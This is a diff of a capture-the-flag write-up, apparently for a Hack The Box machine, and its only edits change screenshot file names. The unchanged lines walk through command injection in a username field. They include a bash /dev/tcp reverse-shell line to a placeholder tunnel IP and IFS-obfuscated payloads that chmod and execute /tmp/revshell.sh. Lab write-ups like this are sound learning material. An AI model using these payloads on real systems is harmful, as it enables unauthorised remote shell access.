@@ -134,7 +134,7 @@ First I tried some random host name and captured the request with burpsuite and 
 
 From this error we can devise that this API is vulnerable to command injection. So I tried some basic command to test it.
 
-<figure><img src="../.gitbook/assets/Untitled 15.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 15 (1).png" alt=""><figcaption></figcaption></figure>
 
 From the response, we can see the response of the id command and now its proved that the application is vulnerable to command injection. Now its time to use this vulnerability to gain access to the machine.
 
@@ -148,7 +148,7 @@ bash -i >& /dev/tcp/<Your_HTB_tunnel_IP>/9001 0>&1
 
 Now start a simple HTTP server with python using the command `python3 -m http.server`.
 
-<figure><img src="../.gitbook/assets/Untitled 16.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 16 (1).png" alt=""><figcaption></figcaption></figure>
 
 Now its time to download this reverse shell on the target machine. You can use this below command to download the reverse shell on the target machine by supplying this as the value to the username field.
 
@@ -162,11 +162,11 @@ I have used a variable IFS in the above command. To know about it, check this ou
 [https://www.youtube.com/watch?v=so8IRuhWjEM](https://www.youtube.com/watch?v=so8IRuhWjEM)
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/Untitled 17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 17 (1).png" alt=""><figcaption></figcaption></figure>
 
 From the response we can see that there is no error thrown. We can verify that the reverse shell is downloaded on the target machine by checking the terminal where we hosted the simple HTTP server using python. You will be able to see a GET request to `/revshell.sh`, which shows that the file is downloaded successfully.
 
-<figure><img src="../.gitbook/assets/Untitled 18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 18 (1).png" alt=""><figcaption></figcaption></figure>
 
 Next we have to provide executable permission to the reverse shell file to execute it. You can do this by supplying the following command.
 
@@ -174,11 +174,11 @@ Next we have to provide executable permission to the reverse shell file to execu
 $(IFS=_;command='chmod_777_/tmp/revshell.sh';$command;)
 ```
 
-<figure><img src="../.gitbook/assets/Untitled 19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 19 (1).png" alt=""><figcaption></figcaption></figure>
 
 No error from the response and thus we have successfully updated the file permissions. Now its time to execute the reverse shell. But before that we have to start a `netcat` listener on our local machine on port `9001`.
 
-<figure><img src="../.gitbook/assets/Untitled 20.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 20 (1).png" alt=""><figcaption></figcaption></figure>
 
 Finally, its time to execute the reverse shell, supply the following command to do so.
 
@@ -186,11 +186,11 @@ Finally, its time to execute the reverse shell, supply the following command to 
 $(IFS=_;command='/tmp/revshell.sh';$command;)
 ```
 
-<figure><img src="../.gitbook/assets/Untitled 21.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 21 (1).png" alt=""><figcaption></figcaption></figure>
 
 No error and no response, check the `netcat` listener. We have successfully got the reverse shell back.
 
-<figure><img src="../.gitbook/assets/Untitled 22.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/Untitled 22 (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
